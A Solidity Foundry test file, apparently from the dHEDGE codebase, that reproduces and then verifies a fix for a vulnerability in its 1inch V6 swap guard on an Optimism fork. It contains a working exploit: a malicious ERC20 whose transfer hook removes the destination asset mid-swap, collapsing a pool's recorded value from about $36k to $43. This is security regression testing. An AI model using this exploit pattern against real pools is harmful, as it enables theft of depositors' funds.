// SPDX-License-Identifier: MIT
// solhint-disable one-contract-per-file
pragma solidity >=0.7.6 <0.9.0;
pragma abicoder v2;

import {IUniswapV3Factory} from "@uniswap/v3-core/contracts/interfaces/IUniswapV3Factory.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Test} from "forge-std/Test.sol";

import {Governance} from "../../../../contracts/Governance.sol";
import {OneInchV6Guard} from "../../../../contracts/guards/contractGuards/OneInchV6Guard.sol";
import {IUniswapV2Factory} from "../../../../contracts/interfaces/uniswapV2/IUniswapV2Factory.sol";

interface IAggregationRouterV6 {
  struct SwapDescription {
    address srcToken; // IERC20
    address dstToken; // IERC20
    address payable srcReceiver;
    address payable dstReceiver;
    uint256 amount;
    uint256 minReturnAmount;
    uint256 flags;
  }

  function swap(
    address sender,
    SwapDescription calldata desc,
    bytes calldata data
  ) external payable returns (uint256 returnAmount);

  function unoswap2(
    uint256 srcToken,
    uint256 srcAmount,
    uint256 dstAmount,
    uint256 pool1,
    uint256 pool2
  ) external returns (uint256);
}

interface IPoolLogic {
  function execTransaction(address to, bytes calldata data) external returns (bool success);
}

interface IERC20 {
  function approve(address spender, uint256 amount) external returns (bool);
  function balanceOf(address account) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
}

interface IUniswapV2Router02 {
  function addLiquidity(
    address tokenA,
    address tokenB,
    uint256 amountADesired,
    uint256 amountBDesired,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

interface IPoolManagerLogic {
  struct Asset {
    address asset;
    bool isDeposit;
  }
  function totalFundValue() external view returns (uint256);
  function changeManager(address newManager, string memory newManagerName) external;
  function manager() external view returns (address);
  function changeAssets(Asset[] calldata _addAssets, address[] calldata _removeAssets) external;
  function setTrader(address _trader) external;
}

// Run with forge test --evm-version cancun --mc OneInchV6DstTokenTest
contract OneInchV6DstTokenTest is Test {
  IAggregationRouterV6 public router = IAggregationRouterV6(0x111111125421cA6dc452d289314280a0f8842A65);
  IERC20 public weth = IERC20(0x4200000000000000000000000000000000000006);
  IERC20 public dai = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);

  IPoolLogic public pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
  IPoolManagerLogic public manager = IPoolManagerLogic(0x950A19078d33f732d35d3630c817532308490cCD);
  address public managerAddress = 0xeFc4904b786A3836343A3A504A2A3cb303b77D64;

  IUniswapV2Router02 public uniRouter = IUniswapV2Router02(0x4A7b5Da61326A6379179b40d00F57E5bbDC962c2);
  IUniswapV2Factory public uniFactory = IUniswapV2Factory(0x0c3c1c532F1e39EdF36BE9Fe0bE1410313E074Bf);

  uint256 public opFork;

  address public slippageAccumulator = 0x2474680A3475ede148B5270f7736Cae6d63c06D5;
  IUniswapV3Factory public uniswapV3Factory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
  Governance public dHEDGEGovernance = Governance(0xa9F912c1dB1b844fd96192Ac3B496E9d8F445bc9);
  address public dHEDGEAdminOptimism = 0x90b1a66957914EbbE7a8df254c0c1E455972379C;

  function setUp() public {
    opFork = vm.createSelectFork(vm.envString("OPTIMISM_URL"));
    assertEq(opFork, vm.activeFork());
    vm.rollFork(121303383);

    deal(address(weth), address(managerAddress), 100 ether);
    deal(address(dai), address(managerAddress), 500000e18);
  }

  function test_remove_dst_token_during_execute_poc() public {
    bytes memory data = _executeScenario();

    pool.execTransaction(address(router), data);
    assertEq(43.964297348421959993e18, manager.totalFundValue()); // $43 tvl
  }

  function test_remove_dst_token_during_execute_fix() public {
    address newOneInchV6Guard = address(
      new OneInchV6Guard(slippageAccumulator, uniFactory, uniswapV3Factory, address(0))
    );
    vm.prank(dHEDGEAdminOptimism);
    dHEDGEGovernance.setContractGuard(address(router), newOneInchV6Guard);

    bytes memory data = _executeScenario();

    vm.expectRevert("unsupported destination asset");
    pool.execTransaction(address(router), data);
  }

  function _executeScenario() internal returns (bytes memory data) {
    IPoolManagerLogic.Asset[] memory assets = new IPoolManagerLogic.Asset[](1);
    assets[0].asset = address(dai);

    vm.startPrank(managerAddress);
    manager.changeAssets(assets, new address[](0)); // adding dai as supported token

    MaliciousERC20 malToken = new MaliciousERC20();
    deal(address(malToken), address(managerAddress), 1e24);

    weth.approve(address(uniRouter), 1e18);
    dai.approve(address(uniRouter), 500000e18);
    malToken.approve(address(uniRouter), 1e24);
    uniRouter.addLiquidity(address(weth), address(malToken), 1e18, 1000e18, 0, 0, managerAddress, block.timestamp);
    uniRouter.addLiquidity(address(dai), address(malToken), 500000e18, 1e6, 0, 0, managerAddress, block.timestamp);
    address pair1 = uniFactory.getPair(address(weth), address(malToken));
    address pair2 = uniFactory.getPair(address(dai), address(malToken));

    deal(address(weth), address(pool), 10 ether);
    manager.setTrader(address(malToken));

    data = abi.encodeWithSelector(weth.approve.selector, address(router), 100e18);
    // Execute the transaction
    pool.execTransaction(address(weth), data);
    assertEq(weth.allowance(address(pool), address(router)), 100e18);

    assertEq(36259.841297348421959993e18, manager.totalFundValue()); // $36k tvl
    malToken.setUpAttack();
    uint256 pairValue = uint256(uint160(pair1)) + 2 ** 247;
    uint256 pairValue2 = uint256(uint160(pair2)) + 2 ** 247;
    data = abi.encodeWithSelector(
      IAggregationRouterV6.unoswap2.selector,
      uint256(uint160(address(weth))),
      10e18,
      40000e18,
      pairValue,
      pairValue2
    );
  }
}

contract MaliciousERC20 is ERC20, Test {
  IPoolManagerLogic public manager = IPoolManagerLogic(0x950A19078d33f732d35d3630c817532308490cCD);
  IPoolLogic public pool = IPoolLogic(0x749E1d46C83f09534253323A43541A9d2bBD03AF);
  IERC20 public dai = IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);

  address public attackSender = address(1001);
  bool public attk;

  constructor() ERC20("", "") {}

  function setUpAttack() public {
    attk = true;
  }

  function transfer(address receiver, uint256 amount) public override returns (bool) {
    if (attk) {
      address[] memory addrs = new address[](1);
      addrs[0] = address(dai);

      manager.changeAssets(new IPoolManagerLogic.Asset[](0), addrs);

      attk = false;
    }

    return super.transfer(receiver, amount);
  }
}
